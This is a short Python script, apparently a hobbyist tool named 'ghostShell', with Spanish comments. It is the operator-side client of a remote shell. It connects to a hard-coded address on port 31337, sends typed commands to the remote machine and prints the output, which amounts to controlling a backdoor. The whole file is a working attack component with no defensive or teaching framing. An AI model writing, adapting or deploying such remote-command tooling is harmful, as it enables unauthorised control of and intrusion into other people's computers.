#!/usr/bin/python

# ghostShell v2.0, Author @guguvk (Axel González)

import socket, signal

signal.signal(signal.SIGINT, signal.SIG_DFL)

address = "192.168.154.128" #Aqui va tu ip

with socket.socket() as s:
    try:
        s.connect((address, 31337))
    except socket.error as e:
        print(f"Error de conexión: {e}")
        exit(1)

    print('Para salir escribe "exit"')
    while True:
        command = input("Comando: ")
        if command == "exit":
            s.send(command.encode())
            break
        else:
            try:
                s.send(command.encode())
                response = s.recv(4090).decode()
                print("\n"+response)
            except socket.error as e:
                print(f"\n!!Error al enviar/recibir: {e}")
                break

